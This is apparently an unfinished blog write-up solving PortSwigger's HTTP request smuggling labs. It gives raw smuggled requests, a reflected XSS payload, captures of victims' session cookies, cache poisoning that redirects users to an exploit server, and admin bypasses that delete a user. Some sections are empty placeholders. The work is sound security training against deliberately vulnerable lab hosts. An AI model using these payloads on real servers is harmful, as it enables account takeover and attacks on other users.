---
title: "Portswigger Web Academy: HTTP Request Smuggling"
date: 2026-03-13 # YYYY-MM-DD
lastMod: 2026-06-24
summary: "Solutions for Portswigger's HTTP Request Smuggling academy module."
draft: true
# series: ["Portswigger Web Academy"]
# seriesOrder: 1
categories: ["PSWA", "hacking"]
tags: ["appsec", "pswa", "websec", "hacking"]
---

## Introduction

Labs: https://portswigger.net/web-security/all-labs#http-request-smuggling

> [!IMPORTANT] Heads up!
> Just so you're warned - this post ended up *way* longer than I thought it would be. Make judicious use of the Table of Contents on the right hand side to find solutions that interest you!
{icon="circle-info"}

## Challenge 1: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

> [!QUOTE]+ Problem Prompt
> This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
> 
> To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response.
> Note
> 
> Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
{icon="circle-question"}

For the first lab, this one is relatively straightforward. To discover the vulnerability, we're sending a smuggled request fragment that will see if the front end uses the `Content-Length` or `Transfer-Encoding` header as its source of truth. If it ignores the CL and respects the TE header, it will see two complete requests with a body of A; if it respects it and ignores the TE, it's going to forward the "complete" request over to the backend, which will get a request with a body that starts, but never ends. We'll see a timeout and then be on our way to smuggling a request successfully.

The test request we'll send is going to look something like this when all is said and done:

![CL.TE Timeout Request](images/0x01/cl-te-timeout-test.png#center)

To set this up, we'll want to do a few things - grab any request (I use one to the homepage) and send it to Repeater. Under the Inspector window, change the HTTP version from `HTTP/2` to `HTTP/1.1` and send the request to make sure it accepts it. I also like to minify the request, just to clean up all the unnecessary headers that get added by browsers, etc.

Now we need to set up the `CL.TE` smoke test - in the Repeater window, click the gear cog icon and uncheck the "Update Content-Length" to stop Burp from automatically updating the header as we add content. Set the `Content-Length` to 3 and send the request:

![CL.TE Timeout Success](images/0x01/server-timeout.png#center)

As expected, we no longer see the timeout - meaning that if we re-check the "Update Content-Length" header and let it update the `Content-Length` to include the whole request body, it shouldn't serve us the timeout any more:

![CL.TE Timeout Fixed](images/0x01/server-timeout-fix.png#center)

Now that we've identified how the headers are being processed, we can build a smuggled request that causes the next request in the series to return a `404 Not Found` response. To do so, we tack a request fragment on to what we already have - all we need is the method, path, HTTP version, and a dangling header to handle the incoming request line. Once we do that, it should look like this (with the follow-up request shown in green):

![CL.TE Request Smuggled](images/0x01/cl-te-smuggle-final.png#center)

So now, we just have to build and send the request twice to get our `404 Not Found` response. Note that in setting up the request, we no longer leave a trailing `\r\n` at the end of the request. If that gets left in the body, the dangling `Foo: x` header won't catch the first line of the incoming request, leaving us with the backend returning `200 OK`s with each request.

![CL.TE Request Smuggled](images/0x01/request-smuggled-test.png#center)

## Challenge 2: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

> [!QUOTE]+ Problem Prompt
> This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding.
> 
> To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response.
> Note
> 
> Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
{icon="circle-question"}

This lab is roughly as straightforward as the CL.TE one - this time, we need to confirm that the frontend uses the `Transfer-Encoding` header instead of the `Content-Length` one. The best way to test this is to send a fragmented requst - one that the CL fully contains, but the TE shows as invalid. Doing so will cause the frontend to timeout while it waits for more data to come in, and is set up like this:

![TE.CL Request Smuggling test request setup](images/0x02/te-cl-smuggle-test.png#center)

roughly same process as last time - take homepage req, minify, convert to post

struggled a lot with getting the right length on this one - easiest way is to set up a scratch pad for the current req + the next one and highlight to get lengths calculated by burp

![Burp hex calculation for TE.CL smuggling request length](images/0x02/burp-hex-calculation.png#center)

final:
```
POST / HTTP/1.1
Host: 0a9800c603cdf6ef81c93e8e005d0034.web-security-academy.net
Content-Length: 4
Transfer-Encoding: chunked

6c
GET /404 HTTP/1.1
Host: 0a9800c603cdf6ef81c93e8e005d0034.web-security-academy.net
Content-Length: 90

x=
0


```

followed by a get to / results in 404



## Challenge 3: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

> [!QUOTE]+ Problem Prompt
>  This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it.
> 
> To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.
> Note
> 
> Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
{icon="circle-question"}

asdf

POST makes it try to go to

## Challenge 4: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

> [!QUOTE]+ Problem Prompt
>  This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it.
> 
> To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.
> Note
> 
> Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
{icon="circle-question"}


asdf

## Challenge 5: Exploiting HTTP request smuggling to reveal front-end request rewriting

> [!QUOTE]+ Problem Prompt
>  This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
> 
> There's an admin panel at /admin, but it's only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It's similar to the X-Forwarded-For header but has a different name.
> 
> To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos.
> Note
> 
> Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
{icon="circle-question"}


asdf

adding this header: `X-pNuuiC-Ip: 104.63.70.82`

## Challenge 6: Exploiting HTTP request smuggling to capture other users' requests

> [!QUOTE]+ Problem Prompt
>  This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
> 
> To solve the lab, smuggle a request to the back-end server that causes the next user's request to be stored in the application. Then retrieve the next user's request and use the victim user's cookies to access their account.  
>   
> Notes  
>  
> - Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.  
> - The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required.
{icon="circle-question"}


asdf


```
POST / HTTP/1.1
Host: 0a3a0053031a359682ec7e9b003b0026.web-security-academy.net
Content-Length: 332
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: 0a3a0053031a359682ec7e9b003b0026.web-security-academy.net
Cookie: session=d3eEZLsIq5VchYQyHQdP02THnZtqlfsh
Content-Length: 950
Content-Type: application/x-www-form-urlencoded

csrf=fSc9fJATebAcjsLUjQsGhrZ0pUFHocrj&postId=5&name=test&email=a%40a.com&website=https%3A%2F%2Fa.a&comment=


```

## Challenge 7: Exploiting HTTP request smuggling to deliver reflected XSS

> [!QUOTE]+ Problem Prompt
>  This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
> 
> The application is also vulnerable to reflected XSS via the User-Agent header.
> 
> To solve the lab, smuggle a request to the back-end server that causes the next user's request to receive a response containing an XSS exploit that executes alert(1).
> Notes
> 
>     Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
>     The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required.
{icon="circle-question"}



asdf

note the lack of `\r\n` on the end
```
POST / HTTP/1.1
Host: 0a4000430333e77180d803f6008600d0.web-security-academy.net
Content-Length: 209
Transfer-Encoding: chunked

0

GET /post?postId=8 HTTP/1.1
Host: 0a4000430333e77180d803f6008600d0.web-security-academy.net
Cookie: session=fchmjufVn8EIUtDCgjqEOajZ9FGUo2Q0
User-Agent: PSWAHRSTEST"><script>alert(1)</script><"
Foo: X
```

url: https://0a4000430333e77180d803f6008600d0.web-security-academy.net/post?postId=8


## Challenge 8: Response queue poisoning via H2.TE request smuggling

> [!QUOTE]+ Problem Prompt
> This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.
> 
> To solve the lab, delete the user carlos by using response queue poisoning to break into the admin panel at /admin. An admin user will log in approximately every 15 seconds.
> 
> The connection to the back-end is reset every 10 requests, so don't worry if you get it into a bad state - just send a few normal requests to get a fresh connection.
{icon="circle-question"}

step 1 - find the queue poisoning

attack req
```
POST / HTTP/2
Host: 0ad100960382316381bef2d6009f00c3.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 95

0

GET /404 HTTP/1.1
Host: 0ad100960382316381bef2d6009f00c3.web-security-academy.net




```

not sure if it worked, but browsed to the page and it broke a lot of css :D

css_broken.jpg


sending the payload a few times, then a GET to `/404` results in the page loading, showing we've desync'd the queue


step 2 - grab the admin user's response from queue

trying to get via burp intruder, set a grep on carlos
no success; thinking it's because of the low connection reuse limit of 10

trying again with a tip in mind from the article - use 404/nonexistent page for both URLs to help distinguish
- set to auto-pause if it sees carlos, added grep for carlos in response
- no luck again - reshifting focus

trying to have it run until it sees _not_ a 404
- auto pause if it goes off 404

ultimately was in the right vein - just got unlucky with all the timings
- will see a 302 with a new session cookie - snag it and add it to browser

browse to admin panel then delete carlos

asdf

## Challenge 9: H2.CL request smuggling

> [!QUOTE]+ Problem Prompt
> This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.
> 
> To solve the lab, perform a request smuggling attack that causes the victim's browser to load and execute a malicious JavaScript file from the exploit server, calling alert(document.cookie). The victim user accesses the home page every 10 seconds. 
{icon="circle-question"}

step 1 - finding the HRS

start simple with PoC - do a redir to 404

req
```
POST / HTTP/2
Host: 0aed007a045d220a80f3031000d6004f.web-security-academy.net
Cookie: session=NzeWMJAQjR2FFIESxvr6HXXihEO3rcLj
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /404 HTTP/1.1
Host: 0aed007a045d220a80f3031000d6004f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=


```

response:
```HTTP
HTTP/2 404 Not Found
Content-Type: application/json; charset=utf-8
Set-Cookie: session=3fxl4X2UoFmDOMmG5zNoJkrL076YZHeq; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 11

"Not Found"
```

confirming with a more complicated payload - searching



step 2 - make it load something else

this step took me quite a bit - had to find some way to get it to load our javascript from the exploit server

req:
```
GET /resources/js HTTP/2
Host: 0aed007a045d220a80f3031000d6004f.web-security-academy.net
```

response:
```HTTP
HTTP/2 302 Found
Location: https://0aed007a045d220a80f3031000d6004f.web-security-academy.net/resources/js/
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

now we need to see if we can get it load something with our exploit server in the URL

need to combine the redirect with our HRS to get it to return our server, thus poisoning the cache

attack request:
```
POST / HTTP/2
Host: 0aed007a045d220a80f3031000d6004f.web-security-academy.net
Cookie: session=NzeWMJAQjR2FFIESxvr6HXXihEO3rcLj
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /resources/js HTTP/1.1
Host: exploit-0a5400a9040822e0808502cb012000fc.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 110

search=
```

and now if we request the JS file immediately after:
```
GET /resources/js/analytics.js?uid=1 HTTP/2
Host: 0aed007a045d220a80f3031000d6004f.web-security-academy.net
```

reseponse:

```HTTP
HTTP/2 302 Found
Location: https://exploit-0a5400a9040822e0808502cb012000fc.exploit-server.net/resources/js/
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

now we just have to set up the exploit server to serve malicious JS

server_settings.jpg

honestly, timing was the hardest part of this - so fiddly. easiest way to finally pop alert was to refresh page, let it load, then send the attack payload after analyticsFetcher.js loaded

once you have it popping on yourself, it really is just spray and pray - throw one out every few seconds, hoping that the victim picks it up at the right timing. eventually you'll get the solved banner!

asdf

## Challenge 10: HTTP/2 request smuggling via CRLF injection

> [!QUOTE]+ Problem Prompt
> This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers.
> 
> To solve the lab, use an HTTP/2-exclusive request smuggling vector to gain access to another user's account. The victim accesses the home page every 15 seconds.
> 
> If you're not familiar with Burp's exclusive features for HTTP/2 testing, please refer to the documentation for details on how to use them.
{icon="circle-question"}

asdf

step 1 - ID vulnerable data
my account, nothing too interesting
search has a UL element - maybe reflected XSS delivered via HRS?
nope, doing entity encoding

maybe HRS in a comment field?
we need some kind of data - thinking cookies are the way, via HRS -> post comment with next request's data in comment

kettling request on home page shows that there's a CL.TE behind the H2 frontend
need to use inspector panel to edit the headers, then hit shift+enter to add a `\r\nTransfer-Encoding: chunked` to the request
easiest way is to just add your own header

smuggled request will need the cookie and csrf to submit request

make a request group to quickly test smuggling
Set Send button to Send > Send group in sequence (single connection)

finding the correct length:
cl 1500 seems to be too much
1250 too much
1150 works
1200 doesn't work
1175 works
1190 - probable max

now we change the post id to get a clean page lol
send without the second request in group to hopefully catch the user doing stuff
Send button > Send Current Tab to only send the first request

Looking through the request, we see a couple of extra cookies + a session
add session to our chrome cookies/replace current one, refresh - we're carlos, lab solved!

interestingly, this _isn't_ the solution from portswigger - they used the search feature to pull down the other user's cookie by HRS
tl;dr is that by CRLF'ing the TE header into the search, the next user's request gets popped into your recent searches

## Challenge 11: HTTP/2 request splitting via CRLF injection

> [!QUOTE]+ Problem Prompt
> This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers.
> 
> To solve the lab, delete the user carlos by using response queue poisoning to break into the admin panel at /admin. An admin user will log in approximately every 10 seconds.
> 
> The connection to the back-end is reset every 10 requests, so don't worry if you get it into a bad state - just send a few normal requests to get a fresh connection. 
{icon="circle-question"}

asdf

finding the split - can add a header and kettle the request
req 1 - gives homepage, req 2 - gives 404 page

now weaponize - need to get to /admin to see what's present there
says admin logs every 10 seconds, so hopefully we can catch it by rolling a request every ~4s

we should see a 302 redir, use that session id
can either manually do it via repeater or add the session token to your chrome

set up a request to `/my-account?id=administrator`

```http
GET /my-account?id=administrator HTTP/2
Host: 0a33004f046bb27a818b1be500e40041.web-security-academy.net
Cookie: session=8BcwG5nzHlRqQPySMMl9Gx7zKMRrHw2Y;
```

response has a link to `/admin`
change the request to point to `/admin`

```http
GET /admin HTTP/2
Host: 0a33004f046bb27a818b1be500e40041.web-security-academy.net
Cookie: session=8BcwG5nzHlRqQPySMMl9Gx7zKMRrHw2Y;
```

response has link to `/admin/delete?username=carlos` - this is the goal endpoint

send the delete request for carlos!

## Challenge 12: 0.CL request smuggling

Placeholder.

## Challenge 13: CL.0 request smuggling

Placeholder.

## Challenge 14: HTTP request smuggling, basic CL.TE vulnerability

> [!QUOTE]+ Problem Prompt
>  This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.  
>   
> To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.  
> Note  
> 
> Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
{icon="circle-question"}

Very straightforward

Understand how the requests are set up - confirming by hitting the root

```
POST / HTTP/1.1
Host: 0a8a0082037389ce81129d91006600cc.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 12

0


G


```




## Challenge 15: HTTP request smuggling, basic TE.CL vulnerability

> [!QUOTE]+ Problem Prompt
> This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.
> 
> To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.
> Note
> Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
{icon="circle-question"}

Not as straightforward - need to add in a 2nd request to this one

```
POST / HTTP/1.1
Host: 0a4c00de043ec72981716772003f0060.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 3

55
GPOST / HTTP/1.1
Host: 0a4c00de043ec72981716772003f0060.web-security-academy.net


0


```
Make sure to unset 'Update content length'



## Challenge 16: HTTP request smuggling, obfuscating the TE header

> [!QUOTE]+ Problem Prompt
> This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren't using the GET or POST method.
> 
> To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.
> Note
> 
> Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
{icon="circle-question"}


asdf

helpful article: https://www.yeswehack.com/learn-bug-bounty/http-request-smuggling-guide-vulnerabilities

```
POST / HTTP/1.1
Host: 0ac500a0040c0868815bc6cb00f30085.web-security-academy.net
Transfer-Encoding: chunkedx
Transfer-Encoding: chunked
Content-Length: 6

0

G
```

## Challenge 17: Exploiting HTTP request smuggling to perform web cache poisoning

> [!QUOTE]+ Problem Prompt
> This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server is configured to cache certain responses.
>
>To solve the lab, perform a request smuggling attack that causes the cache to be poisoned, such that a subsequent request for a JavaScript file receives a redirection to the exploit server. The poisoned cache should alert document.cookie.
>Notes
>
>    Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
>    The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required.
{icon="circle-question"}

Full disclosure on this one - it took me a fair bit of trial and error, and a hint from the solution to let me know I wasn't looking for HRS in the right place :) 

step 1 - find a resource that's static, that's cached - that's our target to poison
javascript is usually primed for this

resource:
```
GET /resources/js/tracking.js HTTP/1.1
Host: 0a9b006804cf1098809249aa001200b1.web-security-academy.net
Cookie: session=hgM8eI6kSUkHNCJd85bQFUWSfEAmovg3
```

normal response:
```HTTP
HTTP/1.1 200 OK
Content-Type: application/javascript; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 7
X-Cache: hit
Connection: close
Content-Length: 70

document.write('<img src="/resources/images/tracker.gif?page=post">');
```

step 2 - find a way to smuggle requests

initial attempt attack request:
```
POST / HTTP/1.1
Host: 0a9b006804cf1098809249aa001200b1.web-security-academy.net
Cookie: session=hgM8eI6kSUkHNCJd85bQFUWSfEAmovg3
Content-Length: 169
Transfer-Encoding: chunked

0

GET /exploit HTTP/1.1
Host: exploit-0aec006f044a100b809b48d90123007b.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 153

x=
```

response:
```
HTTP/1.1 404 Not Found
Content-Type: application/json; charset=utf-8
Set-Cookie: session=Hq3LvH31B1HrXJ6h6GqOxiOwANrWTKfZ; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 11

"Not Found"
```

step 3 - weaponize by finding a way to force the HRS to load our exploit

attack request:
```
POST / HTTP/1.1
Host: 0a9b006804cf1098809249aa001200b1.web-security-academy.net
Cookie: session=hgM8eI6kSUkHNCJd85bQFUWSfEAmovg3
Content-Length: 129
Transfer-Encoding: chunked

0


GET /post/next?postId=2 HTTP/1.1
Host: TESTHOST
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

x=
```

next normal response:
```
HTTP/1.1 302 Found
Location: https://TESTHOST/post?postId=3
Set-Cookie: session=0ui8ZxKF4XgBElhtQ3iVbrTxrFuVjQdD; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 0


```

now we can modify the payload to have a real host, i.e. the exploit server

```
POST / HTTP/1.1
Host: 0a9b006804cf1098809249aa001200b1.web-security-academy.net
Cookie: session=hgM8eI6kSUkHNCJd85bQFUWSfEAmovg3
Content-Length: 180
Transfer-Encoding: chunked

0


GET /post/next?postId=2 HTTP/1.1
Host: exploit-0aec006f044a100b809b48d90123007b.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

x=
```

step 4 - make sure we have a payload plugged into the exploit server

exploitserver[.]jpg

step 5 - get the server to cache the response, making all clients redirect to us on the static resource call

this is the easy part - right after sending the attack payload from step 3, we immediately request `/resources/js/tracking.js` to ensure we're the first one to hit it, making it cache our exploit server response instead of the intended JS file

```
GET /resources/js/tracking.js HTTP/1.1
Host: 0a9b006804cf1098809249aa001200b1.web-security-academy.net
Cookie: session=hgM8eI6kSUkHNCJd85bQFUWSfEAmovg3
```

```HTTP
HTTP/1.1 302 Found
Location: https://exploit-0aec006f044a100b809b48d90123007b.exploit-server.net/post?postId=3
Set-Cookie: session=QhSIFaFxbVtL7d6UCPltWuNNBXmcqIKK; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Connection: close
Content-Length: 0
```

now we have an alert box for any client that connects to the server!

## Challenge 18: Exploiting HTTP request smuggling to perform web cache deception

> [!QUOTE]+ Problem Prompt
> This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server is caching static resources.
> 
> To solve the lab, perform a request smuggling attack such that the next user's request causes their API key to be saved in the cache. Then retrieve the victim user's API key from the cache and submit it as the lab solution. You will need to wait for 30 seconds from accessing the lab before attempting to trick the victim into caching their API key.
> 
> You can log in to your own account using the following credentials: wiener:peter
> Notes
> 
> Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
>     The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required.
{icon="circle-question"}

asdf

step 1 - identify the sensitive data in the request

logging in, the my account page has an API key field in a div
verified that you can drop the `?id=wiener` param and it still returns the data

step 2 - find the HRS

detected via homepage:
```
POST / HTTP/1.1
Host: 0ab500460427f24983554bba00e600d7.web-security-academy.net
Content-Length: 6
Transfer-Encoding: chunked

0

x
```

```HTTP
HTTP/1.1 404 Not Found
Content-Type: application/json; charset=utf-8
Set-Cookie: session=f3vft7eJH0xOld5R34zXN2OiMdJuTZPK; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 11

"Not Found"
```

step 3 - find a static endpoint that is cached

As with the previous cache poison lab, tracking.js shows up as a static cached file

request
```
GET /resources/js/tracking.js HTTP/2
Host: 0ab500460427f24983554bba00e600d7.web-security-academy.net
```

response
```HTTP
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: hit
Content-Length: 70

document.write('<img src="/resources/images/tracker.gif?page=post">');
```

technically this could end up being _any_ of the cached files, but this is one of the first ones that stream in the proxy tab after loading the root

step 4 - point the HRS to the sensitive data

we're just putting the pieces together at this point:

```
POST / HTTP/1.1
Host: 0ab500460427f24983554bba00e600d7.web-security-academy.net
Content-Length: 37
Transfer-Encoding: chunked

0

GET /my-account HTTP/1.1
Foo: X
```

step 5 - wait for user to cache their data && call the cached endpoint

this part is annoying, but easy - just keep re-trying the deception, waiting, and refreshing the main page until it sticks the user's data into one of the cached files

easier if you filter on 'X-Cache: hit' (since a miss indicates first caching of a resource, and we shouldn't care about that state)
make sure that JS files aren't filtered, and even include images and anything you wouldn't normally think about checking - as long as it's cached, it's fair game


## Challenge 19: Bypassing access controls via HTTP/2 request tunnelling

> [!QUOTE]+ Problem Prompt
> This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming header names. To solve the lab, access the admin panel at /admin as the administrator user and delete the user carlos.
> 
> The front-end server doesn't reuse the connection to the back-end, so isn't vulnerable to classic request smuggling attacks. However, it is still vulnerable to request tunnelling. 
{icon="circle-question"}

asdf

step 1 - find the tunnel

search present, looks reflected input
- reflected in URL
- search allows HEAD, custom headers
- search HEAD is paddable
- can't pad too far - eventually hit request path too long error
- max pad - CL 5387

login doesn't work for us

post has comments, can anon submit
- probably our vector for getting info out?

index allows POST, HEAD
- custom headers

finally hit some movement - headers can be injected in the name, not the value
- spent all my time doing it in the value portion

needed to add the session into the headers we injected to get around csrf not found error

now we need to find a valid CL to get back all headers
- 200 too short
- 300 too long
- 250 works
- 275 too long
- 265 too long
- 260 too long
- 257 works
- 258 magic number

full headers:
```
Content-Length: 3
cookie: session=EM5LxGf0OZvhC3YzNkfaWRVgz0yMX5uM
X-SSL-VERIFIED: 0
X-SSL-CLIENT-CN: null
X-FRONTEND-KEY: 5146657325079251
x=1
```

worth noting that the frontend key changes per machine boot
- SSL headers don't do much, frontend key is the only one we need

now that we have that, we can try to tunnel to /
- current stick - trying to find a way around the invalid request error I'm getting from the front end

ayyyy tunneled the search to itself

step 2 - hit admin

first attempt at hitting /admin gave a timeout, means the HEAD CL was too long for the GET
same thing with a short padded search, might have to find smaller?

trying a JS file that's 1515 CL
that gives us a hit - our CL is 2776 for the /admin endpoint

new problem - we get a 401 Unauthorized for the frontend request, might need a session?
- just adding a random session still sends 401 unauth
- have to find a way to have the admin cookie returned

nevermind, that's where the SSL client auth headers comes in
- needed to add a \r\n\r\n sequence to the end of the header to get it to drop, something was interfering with our auth headers otherwise

now we need to find a combo of resource + padding that grabs us the full admin page
- the CL from the 200 OK shows 2393
- 3397 seems to be the lowest I can get the search

3397 is ok, because the response headers count as text as far as the CL is concerned
- can now clearly see the `/admin/delete?username=carlos` URL

step 3 - delete carlos

now for the easy part - just edit the tunneled request to have a delete call

## Challenge 20: Web cache poisoning via HTTP/2 request tunnelling

> [!QUOTE]+ Problem Prompt
> This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and doesn't consistently sanitize incoming headers.
> 
> To solve the lab, poison the cache in such a way that when the victim visits the home page, their browser executes alert(1). A victim user will visit the home page every 15 seconds.
> 
> The front-end server doesn't reuse the connection to the back-end, so isn't vulnerable to classic request smuggling attacks. However, it is still vulnerable to request tunnelling. 
{icon="circle-question"}

step 1 - find the tunnel

homepage length - CL: 8774
minimum search length - using [ - CL: 3310


step 2 - insert tunneled response into the cache
step 2a - figure out cache key
- head and get are treated the same, so unkeyed

step 3 - make the tunnel have a XSS payload
search is doing entity encoding

Placeholder.

## Challenge 21: Client-side desync

Placeholder.

## Challenge 22: Server-side pause-based request smuggling

Placeholder.